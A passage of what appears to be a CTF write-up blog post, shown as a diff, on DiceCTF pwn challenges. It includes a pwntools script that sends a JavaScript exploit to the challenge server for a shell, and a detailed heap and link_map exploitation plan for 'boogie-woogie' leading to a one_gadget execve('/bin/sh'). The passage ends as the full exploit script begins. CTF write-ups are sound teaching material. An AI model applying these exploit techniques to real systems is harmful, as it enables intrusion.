+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mf">3.7960572222424763</span><span class="nx">e</span><span class="o">-</span><span class="mi">280</span><span class="p">,</span> <span class="mf">3.7963592540881645</span><span class="nx">e</span><span class="o">-</span><span class="mi">280</span><span class="p">,</span> <span class="mf">3.796288397419065</span><span class="nx">e</span><span class="o">-</span><span class="mi">280</span><span class="p">,</span> <span class="mf">3.8219835402295355</span><span class="nx">e</span><span class="o">-</span><span class="mi">280</span><span class="p">,</span> <span class="mf">3.7965429435410983</span><span class="nx">e</span><span class="o">-</span><span class="mi">280</span><span class="p">,</span> <span class="mf">3.7965737440041074</span><span class="nx">e</span><span class="o">-</span><span class="mi">280</span><span class="p">,</span> <span class="mf">69477412.1406443</span><span class="p">,</span> <span class="mf">1.7387995134439084</span><span class="nx">e</span><span class="o">+</span><span class="mi">162</span><span class="p">,</span> <span class="mf">2261634.5098039214</span><span class="p">,{},[</span><span class="mi">4444</span><span class="p">],[</span><span class="mi">5555</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="mh">0x1000</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span><span class="nx">test</span><span class="p">();}</span>
+</span></span><span class="line"><span class="cl"><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">&#34;Hello World&#34;</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>We just need to send the above script to the remote with below script, and we will get a shell!</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;mc.ax&#39;</span><span class="p">,</span> <span class="mi">32421</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">poc</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;./example.js&#39;</span><span class="p">,</span> <span class="s1">&#39;rb&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">readlines</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;&#39;EOF&#39;&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">line</span> <span class="ow">in</span> <span class="n">poc</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">line</span><span class="o">.</span><span class="n">strip</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;EOF&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><img src="https://i.imgur.com/6pZ0JWZ.png"/>
+<p>I got second blood in this challenge :)
+<img src="https://i.imgur.com/nZtg0rD.png"/></p>
+<blockquote>
+<p><strong>Flag: dice{hop_skip_shortjmp}</strong></p>
+</blockquote>
+<h2 id="boogie-woogie">boogie-woogie</h2>
+<div class="details admonition quote open">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-quote-right fa-fw" aria-hidden="true"></i>Description<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content"><p>i&rsquo;ve been watching too much jjk
+due to super bruteforce, we are forced to add POW. this is why we can&rsquo;t have nice things</p>
+<p>nc mc.ax 31040</p>
+</div>
+        </div>
+    </div>
+<h3 id="initial-analysis-1">Initial Analysis</h3>
+<p>For this challenge, we were presented with a binary named <code>boogie-woogie</code>. The initial step involved examining the binary&rsquo;s mitigations.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">╰─❯ checksec boogie-woogie
+</span></span><span class="line"><span class="cl">    Arch:     amd64-64-little
+</span></span><span class="line"><span class="cl">    RELRO:    Full RELRO
+</span></span><span class="line"><span class="cl">    Stack:    Canary found
+</span></span><span class="line"><span class="cl">    NX:       NX enabled
+</span></span><span class="line"><span class="cl">    PIE:      PIE enabled
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>All protections were found to be active. Now, it&rsquo;s time to check the disassembly of the important functions:
+<strong>main</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span> <span class="kr">__cdecl</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="kr">__int64</span> <span class="n">v4</span><span class="p">;</span> <span class="c1">// [rsp+8h] [rbp-18h] BYREF
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kr">__int64</span> <span class="n">v5</span><span class="p">;</span> <span class="c1">// [rsp+10h] [rbp-10h] BYREF
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="n">v6</span><span class="p">;</span> <span class="c1">// [rsp+18h] [rbp-8h]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">  <span class="n">v6</span> <span class="o">=</span> <span class="nf">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">puts</span><span class="p">(</span><span class="n">_art</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">puts</span><span class="p">(</span><span class="n">s</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="k">while</span> <span class="p">(</span> <span class="n">data</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">v5</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\n\x1B</span><span class="s">[31;49;1;4m%s</span><span class="se">\x1B</span><span class="s">[0m</span><span class="se">\n\n\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">data</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">      <span class="s">&#34;The sound of </span><span class="se">\x1B</span><span class="s">[0;33mgion shoja bells</span><span class="se">\x1B</span><span class="s">[0m echoes the impermanence of all things. The color</span><span class="se">\n</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl">      <span class="s">&#34;of </span><span class="se">\x1B</span><span class="s">[0;33msala flowers</span><span class="se">\x1B</span><span class="s">[0m reveals the truth that the prosperous must decline. </span><span class="se">\x1B</span><span class="s">[4;33mHowever</span><span class="se">\x1B</span><span class="s">[0m! We</span><span class="se">\n</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl">      <span class="s">&#34;are the exception:&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">__isoc99_scanf</span><span class="p">(</span><span class="s">&#34;%zu %zu&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">v4</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">v5</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">clap</span><span class="p">(</span><span class="n">v4</span><span class="p">,</span> <span class="n">v5</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>clap</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">char</span> <span class="o">*</span><span class="kr">__fastcall</span> <span class="nf">clap</span><span class="p">(</span><span class="kr">__int64</span> <span class="n">a1</span><span class="p">,</span> <span class="kr">__int64</span> <span class="n">a2</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="o">*</span><span class="n">result</span><span class="p">;</span> <span class="c1">// rax
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">  <span class="n">data</span><span class="p">[</span><span class="n">a1</span><span class="p">]</span> <span class="o">^=</span> <span class="n">data</span><span class="p">[</span><span class="n">a2</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">  <span class="n">data</span><span class="p">[</span><span class="n">a2</span><span class="p">]</span> <span class="o">^=</span> <span class="n">data</span><span class="p">[</span><span class="n">a1</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">  <span class="n">result</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">data</span><span class="p">[</span><span class="n">a1</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">  <span class="n">data</span><span class="p">[</span><span class="n">a1</span><span class="p">]</span> <span class="o">^=</span> <span class="n">data</span><span class="p">[</span><span class="n">a2</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>The binary&rsquo;s structure is straightforward. Essentially, it allows for the swapping of bytes within any <code>rw</code> (read-write) area of the binary, specifically relative to the <code>bss</code> section (where <code>data</code> is stored). This byte-swapping capability is the sole interaction allowed, and the program terminates if the value at <code>data[0]</code> is set to <code>NULL</code>.</p>
+<h3 id="solution-1">Solution</h3>
+<p>Despite the binary&rsquo;s simplicity, crafting an exploit poses a significant challenge.</p>
+<h4 id="brute-force-heap-offset">Brute-force heap offset</h4>
+<p>Initially, we can leak any value if we know its offset relative to the <code>data</code>, by exchanging the <code>target_offset</code> with <code>0x96</code>. The value <code>0x96</code> represents the final byte in the <code>data</code> string, indicating that swapping and moving our target value to <code>data[0x96]</code> will result in its display on the prompt.</p>
+<p>The primary challenge arises from the fact that the <code>bss</code> area lacks valuable information for leakage, except for the <code>PIE</code> base address. This limitation prompts the exploration of alternative strategies, such as attempting to brute-force the heap offset. Notably, if a viable offset within the heap can be identified, it becomes feasible to trace back to the heap&rsquo;s <code>top</code> chunk, and we can do more with it later on.</p>
+<p>Is brute-forcing the heap offset a feasible strategy? Indeed, it is. Typically, the heap spans an area of 0x21000. Observations indicate that the gap between the <code>bss</code> and heap areas ranges from approximately <code>0x0XXY000</code> to <code>0x1XXY000</code>. Given the heap&rsquo;s default size exceeds 0x10000, correctly deducing the <code>XX</code> nibble ensures that any <code>Y</code> nibble exist, thus significantly reducing the brute-force effort to roughly 8 bits. This reduction means that the brute-force approach is quite practical.</p>
+<h4 id="leak-libc-address">Leak <code>libc</code> address</h4>
+<p>Let say that we are abole to brute-force the heap offset and identifying the <code>top</code> chunk, the next question is: what possibilities does this open up? A close examination of the heap chunks in <code>gdb</code> reveals the default layout.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Chunk(addr = 0x555555564000 , size=0x290, flags=PREV_INUSE)
+</span></span><span class="line"><span class="cl">Chunk(addr = 0x555555564290 , size=0x410, flags=PREV_INUSE)
+</span></span><span class="line"><span class="cl">Chunk(addr = 0x5555555646a0 , size=0x410, flags=PREV_INUSE)
+</span></span><span class="line"><span class="cl">Chunk(addr = 0x555555564ab0 , size=0x20550, flags=PREV_INUSE)  &lt;-  top
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Unfortunately, it does not contain any directly useful values for leakage. However, an intriguing opportunity arises with the potential to <strong>corrupt the top chunk size</strong>.</p>
+<p>Now, consider the scenario where the <code>top</code> chunk size is altered from <code>0x20550</code> to merely <code>0x550</code> with the <code>swap</code>. It&rsquo;s observed that triggering a <code>malloc(0x800)</code> call is straightforward via <code>scanf</code>, especially by prefixing our inputted number with numerous leading zeros. What implications would this manipulation have when combined with a <code>malloc(0x800)</code> call triggered by <code>scanf</code>?</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">--- BEFORE SCANF (CORRUPTED TOP CHUNK)
+</span></span><span class="line"><span class="cl">gef&gt; heap chunks
+</span></span><span class="line"><span class="cl">Chunk(addr = 0x555555564000 , size=0x290, flags=PREV_INUSE)
+</span></span><span class="line"><span class="cl">Chunk(addr = 0x555555564290 , size=0x410, flags=PREV_INUSE)
+</span></span><span class="line"><span class="cl">Chunk(addr = 0x5555555646a0 , size=0x410, flags=PREV_INUSE)
+</span></span><span class="line"><span class="cl">Chunk(addr = 0x555555564ab0 , size=0x550, flags=PREV_INUSE)  &lt;-  top
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">--- AFTER SCANF
+</span></span><span class="line"><span class="cl">gef&gt; heap chunks
+</span></span><span class="line"><span class="cl">Chunk(addr = 0x555555564000 , size=0x290, flags=PREV_INUSE)
+</span></span><span class="line"><span class="cl">Chunk(addr = 0x555555564290 , size=0x410, flags=PREV_INUSE)
+</span></span><span class="line"><span class="cl">Chunk(addr = 0x5555555646a0 , size=0x410, flags=PREV_INUSE)
+</span></span><span class="line"><span class="cl">Chunk(addr = 0x555555564ab0 , size=0x530, flags=PREV_INUSE, fd=0x7ffff7e1ace0, bk=0x7ffff7e1ace0)  &lt;-  unsortedbins[1/1]
+</span></span><span class="line"><span class="cl">Chunk(addr = 0x555555564fe0 , size=0x10, flags=)
+</span></span><span class="line"><span class="cl">Chunk(addr = 0x555555564ff0 , size=0x10, flags=PREV_INUSE)
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Upon inspecting the heap&rsquo;s state in <code>gdb</code> following our manipulation, we observe the presence of an unsorted bin chunk. This opens the door to leaking a <code>libc</code> address. Having the <code>libc</code> address leads to several exploitation pathways.</p>
+<h4 id="exploitation-via-link_map">Exploitation via <code>link_map</code></h4>
+<p>In our approach, we opted for the <strong>link_map</strong> exploitation technique, as detailed in <a href="https://github.com/nobodyisnobody/docs/tree/main/code.execution.on.last.libc/#2---targetting-ldso-link_map-structure" target="_blank" rel="noopener noreffer ">nobodyisnobody&rsquo;s article</a>. To effectively trigger the code outlined in <a href="https://elixir.bootlin.com/glibc/glibc-2.35/source/elf/dl-fini.c#L147" target="_blank" rel="noopener noreffer ">glibc&rsquo;s <code>dl-fini.c</code></a>, a series of steps are required:</p>
+<ul>
+<li>Nullify the <code>link_map-&gt;DT_FINI_ARRAY</code>.</li>
+<li>Overwrite <code>link_map-&gt;l_info[DT_FINI]</code> with an address we control, allowing us to modify the <code>d_un.d_ptr</code> value subsequently.</li>
+<li>Adjust <code>link_map-&gt;l_Addr</code> and <code>link_map-&gt;l_info[DT_FINI]-&gt;d_un.d_ptr</code> so the sum of their values will point to our desired function address.</li>
+<li>Trigger exit.</li>
+</ul>
+<p>Exploring the possibilities with <code>one_gadget</code>, we identified one good gadget.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="mh">0xebc85</span> <span class="n">execve</span><span class="p">(</span><span class="s2">&#34;/bin/sh&#34;</span><span class="p">,</span> <span class="n">r10</span><span class="p">,</span> <span class="n">rdx</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">constraints</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">  <span class="n">address</span> <span class="n">rbp</span><span class="o">-</span><span class="mh">0x78</span> <span class="n">is</span> <span class="n">writable</span>
+</span></span><span class="line"><span class="cl">  <span class="p">[</span><span class="n">r10</span><span class="p">]</span> <span class="o">==</span> <span class="n">NULL</span> <span class="o">||</span> <span class="n">r10</span> <span class="o">==</span> <span class="n">NULL</span>
+</span></span><span class="line"><span class="cl">  <span class="p">[</span><span class="n">rdx</span><span class="p">]</span> <span class="o">==</span> <span class="n">NULL</span> <span class="o">||</span> <span class="n">rdx</span> <span class="o">==</span> <span class="n">NULL</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>The next step involves placing the <code>one_gadget</code> address into the <code>link_map</code>. However, it&rsquo;s important to remember that our ability to write is constrained to swapping bytes. Given this limitation, how can we insert the <code>one_gadget</code> address into the <code>link_map</code>?</p>
+<p>A reliable method involves leaking the stack address, then positioning our targeted bytes on the stack through <code>scanf</code>, followed by swapping them into place. However, we discovered this trick quite late in the process and had already secured the flag using our initial approach, which we will outline here.</p>
+<p>The <code>one_gadget</code> address consists of <code>6 bytes</code>, and the higher <code>3 bytes</code> can be easily written by sourcing them from the <code>libc</code> GOT area. We simply select any <code>libc</code> address present there whose higher <code>3 bytes</code> match those of our chosen <code>one_gadget</code> across multiple runs.</p>
+<p>The <code>1st lower byte</code> of the <code>one_gadget</code> address is consistently <code>0x85</code>. Upon examining the memory, we discovered a value within the <code>ld</code> <code>rw</code> area that invariably contains the <code>0x85</code> byte.</p>
+<p>Regarding the <code>2nd lower byte</code> of the <code>one_gadget</code>, it is influenced by <code>ASLR</code>. Nonetheless, a thorough memory scan revealed a value in the <code>ld</code> <code>rw</code> area that consistently matches the <code>2nd lower byte</code> of the <code>one_gadget</code> address across multiple executions.</p>
+<p>Unfortunately, for the <code>3rd lower byte</code>, there is no address that consistently mirrors the <code>one_gadget</code>&rsquo;s <code>3rd lower byte</code>. Therefore, we relied on luck :), scanning the <code>ld</code> memory with the swap function in each run, hoping to find a <code>byte</code> in the <code>ld</code> area that could match the <code>3rd lower byte</code>.</p>
+<p>Brute-forcing the heap is took some quite time, and every time we hit it, sometime we failed to find the <code>3rd</code> byte in the <code>ld</code> area due to the timeout. However, we hit once and we are able to fetch the flag. Below is our full script with detailed comments:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">  1
+</span><span class="lnt">  2
+</span><span class="lnt">  3
+</span><span class="lnt">  4
+</span><span class="lnt">  5
+</span><span class="lnt">  6
+</span><span class="lnt">  7
+</span><span class="lnt">  8
+</span><span class="lnt">  9
+</span><span class="lnt"> 10
+</span><span class="lnt"> 11
+</span><span class="lnt"> 12
+</span><span class="lnt"> 13
+</span><span class="lnt"> 14
+</span><span class="lnt"> 15
+</span><span class="lnt"> 16
+</span><span class="lnt"> 17
+</span><span class="lnt"> 18
+</span><span class="lnt"> 19
+</span><span class="lnt"> 20
+</span><span class="lnt"> 21
+</span><span class="lnt"> 22
+</span><span class="lnt"> 23
+</span><span class="lnt"> 24
+</span><span class="lnt"> 25
+</span><span class="lnt"> 26
+</span><span class="lnt"> 27
+</span><span class="lnt"> 28
+</span><span class="lnt"> 29
+</span><span class="lnt"> 30
+</span><span class="lnt"> 31
+</span><span class="lnt"> 32
+</span><span class="lnt"> 33
+</span><span class="lnt"> 34
+</span><span class="lnt"> 35
+</span><span class="lnt"> 36
+</span><span class="lnt"> 37
+</span><span class="lnt"> 38
+</span><span class="lnt"> 39
+</span><span class="lnt"> 40
+</span><span class="lnt"> 41
+</span><span class="lnt"> 42
+</span><span class="lnt"> 43
+</span><span class="lnt"> 44
+</span><span class="lnt"> 45
+</span><span class="lnt"> 46
+</span><span class="lnt"> 47
+</span><span class="lnt"> 48
+</span><span class="lnt"> 49
+</span><span class="lnt"> 50
+</span><span class="lnt"> 51
+</span><span class="lnt"> 52
+</span><span class="lnt"> 53
+</span><span class="lnt"> 54
+</span><span class="lnt"> 55
+</span><span class="lnt"> 56
+</span><span class="lnt"> 57
+</span><span class="lnt"> 58
+</span><span class="lnt"> 59
+</span><span class="lnt"> 60
+</span><span class="lnt"> 61
+</span><span class="lnt"> 62
+</span><span class="lnt"> 63
+</span><span class="lnt"> 64
+</span><span class="lnt"> 65
+</span><span class="lnt"> 66
+</span><span class="lnt"> 67
+</span><span class="lnt"> 68
+</span><span class="lnt"> 69
+</span><span class="lnt"> 70
+</span><span class="lnt"> 71
+</span><span class="lnt"> 72
+</span><span class="lnt"> 73
+</span><span class="lnt"> 74
+</span><span class="lnt"> 75
+</span><span class="lnt"> 76
+</span><span class="lnt"> 77
+</span><span class="lnt"> 78
+</span><span class="lnt"> 79
+</span><span class="lnt"> 80
+</span><span class="lnt"> 81
+</span><span class="lnt"> 82
+</span><span class="lnt"> 83
+</span><span class="lnt"> 84
+</span><span class="lnt"> 85
+</span><span class="lnt"> 86
+</span><span class="lnt"> 87
+</span><span class="lnt"> 88
+</span><span class="lnt"> 89
+</span><span class="lnt"> 90
+</span><span class="lnt"> 91
+</span><span class="lnt"> 92
+</span><span class="lnt"> 93
+</span><span class="lnt"> 94
+</span><span class="lnt"> 95
+</span><span class="lnt"> 96
+</span><span class="lnt"> 97
+</span><span class="lnt"> 98
+</span><span class="lnt"> 99
+</span><span class="lnt">100
+</span><span class="lnt">101
+</span><span class="lnt">102
+</span><span class="lnt">103
+</span><span class="lnt">104
+</span><span class="lnt">105
+</span><span class="lnt">106
+</span><span class="lnt">107
+</span><span class="lnt">108
+</span><span class="lnt">109
+</span><span class="lnt">110
+</span><span class="lnt">111
+</span><span class="lnt">112
+</span><span class="lnt">113
+</span><span class="lnt">114
+</span><span class="lnt">115
+</span><span class="lnt">116
+</span><span class="lnt">117
+</span><span class="lnt">118
+</span><span class="lnt">119
+</span><span class="lnt">120
+</span><span class="lnt">121
+</span><span class="lnt">122
+</span><span class="lnt">123
+</span><span class="lnt">124
+</span><span class="lnt">125
+</span><span class="lnt">126
+</span><span class="lnt">127
+</span><span class="lnt">128
+</span><span class="lnt">129
+</span><span class="lnt">130
+</span><span class="lnt">131
+</span><span class="lnt">132
+</span><span class="lnt">133
+</span><span class="lnt">134
+</span><span class="lnt">135
+</span><span class="lnt">136
+</span><span class="lnt">137
+</span><span class="lnt">138
+</span><span class="lnt">139
+</span><span class="lnt">140
+</span><span class="lnt">141
+</span><span class="lnt">142
+</span><span class="lnt">143
+</span><span class="lnt">144
+</span><span class="lnt">145
+</span><span class="lnt">146
+</span><span class="lnt">147
+</span><span class="lnt">148
+</span><span class="lnt">149
+</span><span class="lnt">150
+</span><span class="lnt">151
+</span><span class="lnt">152
+</span><span class="lnt">153
+</span><span class="lnt">154
+</span><span class="lnt">155
+</span><span class="lnt">156
+</span><span class="lnt">157
+</span><span class="lnt">158
+</span><span class="lnt">159
+</span><span class="lnt">160
+</span><span class="lnt">161
+</span><span class="lnt">162
+</span><span class="lnt">163
+</span><span class="lnt">164
+</span><span class="lnt">165
+</span><span class="lnt">166
+</span><span class="lnt">167
+</span><span class="lnt">168
+</span><span class="lnt">169
+</span><span class="lnt">170
+</span><span class="lnt">171
+</span><span class="lnt">172
+</span><span class="lnt">173
+</span><span class="lnt">174
+</span><span class="lnt">175
+</span><span class="lnt">176
+</span><span class="lnt">177
+</span><span class="lnt">178
+</span><span class="lnt">179
+</span><span class="lnt">180
+</span><span class="lnt">181
+</span><span class="lnt">182
+</span><span class="lnt">183
+</span><span class="lnt">184
+</span><span class="lnt">185
+</span><span class="lnt">186
+</span><span class="lnt">187
+</span><span class="lnt">188
+</span><span class="lnt">189
+</span><span class="lnt">190
+</span><span class="lnt">191
+</span><span class="lnt">192
+</span><span class="lnt">193
+</span><span class="lnt">194
+</span><span class="lnt">195
+</span><span class="lnt">196
+</span><span class="lnt">197
+</span><span class="lnt">198
+</span><span class="lnt">199
+</span><span class="lnt">200
+</span><span class="lnt">201
+</span><span class="lnt">202
+</span><span class="lnt">203
+</span><span class="lnt">204
+</span><span class="lnt">205
+</span><span class="lnt">206
+</span><span class="lnt">207
+</span><span class="lnt">208
+</span><span class="lnt">209
+</span><span class="lnt">210
+</span><span class="lnt">211
+</span><span class="lnt">212
+</span><span class="lnt">213
+</span><span class="lnt">214
+</span><span class="lnt">215
+</span><span class="lnt">216
+</span><span class="lnt">217
+</span><span class="lnt">218
+</span><span class="lnt">219
+</span><span class="lnt">220
+</span><span class="lnt">221
+</span><span class="lnt">222
+</span><span class="lnt">223
+</span><span class="lnt">224
+</span><span class="lnt">225
+</span><span class="lnt">226
+</span><span class="lnt">227
+</span><span class="lnt">228
+</span><span class="lnt">229
+</span><span class="lnt">230
+</span><span class="lnt">231
+</span><span class="lnt">232
+</span><span class="lnt">233
+</span><span class="lnt">234
+</span><span class="lnt">235
+</span><span class="lnt">236
+</span><span class="lnt">237
+</span><span class="lnt">238
+</span><span class="lnt">239
+</span><span class="lnt">240
+</span><span class="lnt">241
+</span><span class="lnt">242
+</span><span class="lnt">243
+</span><span class="lnt">244
+</span><span class="lnt">245
+</span><span class="lnt">246
+</span><span class="lnt">247
+</span><span class="lnt">248
+</span><span class="lnt">249
+</span><span class="lnt">250
+</span><span class="lnt">251
+</span><span class="lnt">252
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Filter ld area to be scanned. Skip addresses that always</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># contains zero bytes. `out` file example</span>
+</span></span><span class="line"><span class="cl"><span class="s1">&#39;&#39;&#39;
+</span></span></span><span class="line"><span class="cl"><span class="s1">0x7ff7628f0000:	0x0000000000039e80	0x0000000000000000
+</span></span></span><span class="line"><span class="cl"><span class="s1">0x7ff7628f0010:	0x0000000000000000	0x00007ff7627fda10
+</span></span></span><span class="line"><span class="cl"><span class="s1">0x7ff7628f0020 &lt;_dl_signal_exception@got.plt&gt;:	0x00007ff7627fd960	0x00007ff7627fd9b0
